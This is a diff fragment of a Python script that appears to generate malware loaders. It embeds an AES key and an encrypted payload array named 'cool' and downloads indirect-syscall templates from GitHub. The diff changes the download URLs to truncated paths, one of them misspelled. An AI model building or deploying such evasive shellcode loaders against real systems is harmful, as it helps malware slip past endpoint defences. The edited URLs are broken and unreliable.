@@ -23,9 +23,9 @@ def indirect():
     aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
     aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"
 
-    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indirect.c"
-    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
-    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"
+    url = "https://raw.githubusercontent.com/refs/heads/main/dummyda/indirect/indirect.c"
+    url2 = "https://raw.githubusercontent.com/refs/heads/main/dummyda/indirect/syscalls.asm"
+    url3 = "https://raw.githubusercontent.com/refs/heads/main/dummyda/indirect/syscalls.h"
 
     try:
         res = requests.get(url)
@@ -77,9 +77,9 @@ def indirect2():
     aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
     aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"
 
-    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indi_ker_ntdll.cpp"
-    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
-    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"
+    url = "https://raw.githubusercontent.com/efs/heads/main/dummyda/indirect/indi_ker_ntdll.cpp"
+    url2 = "https://raw.githubusercontent.com/refs/heads/main/dummyda/indirect/syscalls.asm"
+    url3 = "https://raw.githubusercontent.com/refs/heads/main/dummyda/indirect/syscalls.h"
 
     try:
         res = requests.get(url)
